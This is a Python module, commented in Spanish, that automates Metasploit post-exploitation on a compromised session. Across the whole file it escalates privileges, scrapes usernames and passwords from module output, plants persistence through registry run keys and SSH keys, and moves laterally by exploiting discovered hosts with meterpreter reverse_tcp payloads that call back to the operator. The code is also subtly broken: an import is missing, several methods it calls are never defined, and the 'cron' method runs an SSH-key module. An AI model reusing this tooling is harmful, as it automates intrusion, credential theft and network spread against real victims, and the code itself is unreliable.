#!/usr/bin/env python3

import logging
import time
import re
from typing import Dict, List
from pymetasploit3.msfrpc import MsfRpcClient

logger = logging.getLogger(__name__)

class PostExploitation:
    def __init__(self, msf_client: MsfRpcClient, config: Dict):
        """Inicializa el módulo de post-explotación"""
        self.msf_client = msf_client
        self.config = config
    
    async def perform_post_exploitation(self, session_id: str, target_info: Dict) -> Dict:
        """Realiza tareas de post-explotación en una sesión"""
        result = {
            "privilege_escalation": None,
            "credential_harvesting": None,
            "persistence": None,
            "lateral_movement": None
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener información de la sesión
            session = self.msf_client.sessions.session(session_id)
            if not session:
                return result
            
            # Determinar plataforma
            platform = "windows" if "windows" in session.platform else "linux"
            
            # 1. Escalada de privilegios
            if self.config.get("post_exploitation", {}).get("privilege_escalation", {}).get("enabled", False):
                result["privilege_escalation"] = await self._perform_privilege_escalation(session_id, platform)
            
            # 2. Recolección de credenciales
            if self.config.get("post_exploitation", {}).get("credential_harvesting", {}).get("enabled", False):
                result["credential_harvesting"] = await self._harvest_credentials(session_id, platform)
            
            # 3. Establecer persistencia
            if self.config.get("post_exploitation", {}).get("persistence", {}).get("enabled", False):
                result["persistence"] = await self._establish_persistence(session_id, platform)
            
            # 4. Movimiento lateral
            if self.config.get("post_exploitation", {}).get("lateral_movement", {}).get("enabled", False):
                result["lateral_movement"] = await self._perform_lateral_movement(session_id, platform)
        
        except Exception as e:
            logger.error(f"Error en post-explotación: {str(e)}")
        
        return result
    
    async def _perform_privilege_escalation(self, session_id: str, platform: str) -> Dict:
        """Realiza escalada de privilegios"""
        result = {
            "success": False,
            "method": None,
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener módulos de escalada según plataforma
            modules = self.config.get("post_exploitation", {}).get("privilege_escalation", {}).get(platform, [])
            
            for module in modules:
                try:
                    # Configurar y ejecutar módulo
                    post_module = self.msf_client.modules.use('post', module)
                    post_module['SESSION'] = session_id
                    
                    # Ejecutar módulo
                    post_module.execute()
                    
                    # Verificar resultado
                    if "got system" in post_module.output.lower() or "success" in post_module.output.lower():
                        result.update({
                            "success": True,
                            "method": module,
                            "details": post_module.output
                        })
                        break
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo de escalada {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error en escalada de privilegios: {str(e)}")
        
        return result
    
    async def _harvest_credentials(self, session_id: str, platform: str) -> Dict:
        """Recolecta credenciales del sistema"""
        result = {
            "success": False,
            "credentials_found": [],
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener módulos de recolección según plataforma
            modules = self.config.get("post_exploitation", {}).get("credential_harvesting", {}).get(platform, [])
            
            for module in modules:
                try:
                    # Configurar y ejecutar módulo
                    post_module = self.msf_client.modules.use('post', module)
                    post_module['SESSION'] = session_id
                    
                    # Ejecutar módulo
                    post_module.execute()
                    
                    # Procesar resultados
                    if post_module.output:
                        # Extraer credenciales del output
                        credentials = self._extract_credentials(post_module.output)
                        if credentials:
                            result["credentials_found"].extend(credentials)
                            result["success"] = True
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo de recolección {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error en recolección de credenciales: {str(e)}")
        
        return result
    
    def _extract_credentials(self, output: str) -> List[Dict]:
        """Extrae credenciales del output de los módulos"""
        credentials = []
        try:
            # Patrones comunes de credenciales
            patterns = [
                r"Username: (\S+)\s+Password: (\S+)",
                r"(\S+):(\S+)",
                r"user=(\S+)\s+pass=(\S+)"
            ]
            
            for pattern in patterns:
                matches = re.finditer(pattern, output)
                for match in matches:
                    if len(match.groups()) == 2:
                        credentials.append({
                            "username": match.group(1),
                            "password": match.group(2)
                        })
        
        except Exception as e:
            logger.error(f"Error al extraer credenciales: {str(e)}")
        
        return credentials
    
    async def _establish_persistence(self, session_id: str, platform: str) -> Dict:
        """Establece persistencia en el sistema"""
        result = {
            "success": False,
            "method": None,
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener métodos de persistencia según plataforma
            persistence_config = self.config.get("post_exploitation", {}).get("persistence", {}).get(platform, {})
            
            if platform == "windows":
                # Windows persistence methods
                if persistence_config.get("registry_run_keys", False):
                    result = await self._establish_windows_registry_persistence(session_id)
                elif persistence_config.get("scheduled_tasks", False):
                    result = await self._establish_windows_scheduled_task(session_id)
            
            elif platform == "linux":
                # Linux persistence methods
                if persistence_config.get("cron_jobs", False):
                    result = await self._establish_linux_cron_persistence(session_id)
                elif persistence_config.get("ssh_keys", False):
                    result = await self._establish_linux_ssh_persistence(session_id)
        
        except Exception as e:
            logger.error(f"Error al establecer persistencia: {str(e)}")
        
        return result
    
    async def _establish_windows_registry_persistence(self, session_id: str) -> Dict:
        """Establece persistencia en Windows usando registro"""
        result = {
            "success": False,
            "method": "registry",
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Crear consola
            console_id = self.msf_client.consoles.console().get('id')
            
            # Configurar módulo de persistencia
            self.msf_client.consoles.console(console_id).write(f"use post/windows/manage/persistence_exe\n")
            time.sleep(1)
            
            # Configurar opciones
            self.msf_client.consoles.console(console_id).write(f"set SESSION {session_id}\n")
            time.sleep(0.5)
            self.msf_client.consoles.console(console_id).write(f"set STARTUP USER\n")
            time.sleep(0.5)
            
            # Ejecutar módulo
            self.msf_client.consoles.console(console_id).write("run\n")
            
            # Esperar resultado
            time.sleep(5)
            output = self.msf_client.consoles.console(console_id).read()
            
            if "success" in output.lower():
                result.update({
                    "success": True,
                    "details": output
                })
        
        except Exception as e:
            logger.error(f"Error al establecer persistencia en registro: {str(e)}")
        
        return result
    
    async def _establish_linux_cron_persistence(self, session_id: str) -> Dict:
        """Establece persistencia en Linux usando cron"""
        result = {
            "success": False,
            "method": "cron",
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Crear consola
            console_id = self.msf_client.consoles.console().get('id')
            
            # Configurar módulo de persistencia
            self.msf_client.consoles.console(console_id).write(f"use post/linux/manage/sshkey_persistence\n")
            time.sleep(1)
            
            # Configurar opciones
            self.msf_client.consoles.console(console_id).write(f"set SESSION {session_id}\n")
            time.sleep(0.5)
            
            # Ejecutar módulo
            self.msf_client.consoles.console(console_id).write("run\n")
            
            # Esperar resultado
            time.sleep(5)
            output = self.msf_client.consoles.console(console_id).read()
            
            if "success" in output.lower():
                result.update({
                    "success": True,
                    "details": output
                })
        
        except Exception as e:
            logger.error(f"Error al establecer persistencia en cron: {str(e)}")
        
        return result
    
    async def _perform_lateral_movement(self, session_id: str, platform: str) -> Dict:
        """Realiza movimiento lateral desde la sesión"""
        result = {
            "success": False,
            "new_sessions": [],
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener módulos de movimiento lateral según plataforma
            modules = self.config.get("post_exploitation", {}).get("lateral_movement", {}).get(platform, [])
            
            # Descubrir hosts en la red
            discovered_hosts = await self.discover_networks(session_id)
            
            for host in discovered_hosts:
                for module in modules:
                    try:
                        # Configurar y ejecutar módulo
                        exploit = self.msf_client.modules.use('exploit', module)
                        exploit['RHOSTS'] = host
                        
                        # Configurar payload
                        payload = "windows/x64/meterpreter/reverse_tcp" if platform == "windows" else "linux/x86/meterpreter/reverse_tcp"
                        payload_obj = self.msf_client.modules.use('payload', payload)
                        payload_obj['LHOST'] = self._get_local_ip()
                        payload_obj['LPORT'] = random.randint(4000, 4500)
                        
                        # Ejecutar exploit
                        exploit.execute(payload=payload_obj)
                        
                        # Esperar sesión
                        time.sleep(10)
                        sessions = self.msf_client.sessions.list
                        
                        if sessions:
                            new_session_id = list(sessions.keys())[-1]
                            result["new_sessions"].append({
                                "session_id": new_session_id,
                                "target": host,
                                "method": module
                            })
                            result["success"] = True
                    
                    except Exception as e:
                        logger.error(f"Error al ejecutar módulo de movimiento lateral {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error en movimiento lateral: {str(e)}")
        
        return result 